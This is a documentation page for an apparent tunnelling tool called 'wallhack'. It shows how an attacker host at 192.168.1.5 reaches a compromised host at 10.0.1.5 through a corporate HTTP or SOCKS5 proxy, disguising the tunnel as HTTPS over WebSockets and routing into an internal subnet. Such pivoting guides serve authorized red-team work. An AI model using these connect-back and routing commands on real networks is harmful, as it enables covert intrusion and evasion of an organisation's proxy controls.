---
title: HTTP Proxy Example
description: Tunnel through an HTTP or SOCKS5 proxy using TCP with WebSockets.
order: 9
---

# HTTP Proxy Example

In this example, a compromised host (`10.0.1.5`) sits behind a corporate HTTP proxy that intercepts all outbound connections. WebSockets on TCP/443 are used so tunnel traffic appears as HTTPS, and the proxy is configured via the standard `HTTPS_PROXY` environment variable.

An entry node (`192.168.1.5`) listens on TCP/443. Port 443 is used here because the proxy expects HTTPS traffic and the WebSocket upgrade handshake is indistinguishable from a standard HTTPS connection.

{% trafficflow flow="192.168.1.5 (entry) -> proxy.corp.internal:8080 -> 10.0.1.5 (exit) -> 10.10.0.0/24" label="Traffic Flow:" /%}

{% steps %}
{% step title="Attacker (192.168.1.5)" number=1 %}
Listening for WebSocket connections on TCP/443. Negotiates the [entry role](/concepts).

{% codeblock code="wallhack --listen :443/tcp" /%}
{% /step %}

{% step title="Compromised Host (10.0.1.5)" number=2 %}
Connecting back through the corporate proxy. Set `HTTPS_PROXY` to the proxy address before starting. Negotiates the [exit role](/concepts).

```bash
export HTTPS_PROXY=http://proxy.corp.internal:8080
wallhack --connect 192.168.1.5:443/tcp --name peer1
```

If `--name` is omitted, a random name is generated — run `peers` in the REPL to discover it.
{% /step %}

{% step title="Configure Routes" number=3 %}
Add routes for the networks reachable through the compromised host.

Using the entry node REPL (also configures the OS route automatically):
```
wallhack> route add 10.10.0.0/24 via peer1
```

Or directly with the system `ip` tool on the attacker machine:
```bash
ip route add 10.10.0.0/24 dev tun-peer1
```
{% /step %}
{% /steps %}

{% callout type="note" %}
SOCKS5 proxies are also supported. Set `HTTPS_PROXY=socks5://proxy.corp.internal:1080` instead. `NO_PROXY` is respected for comma-separated host exclusions.
{% /callout %}
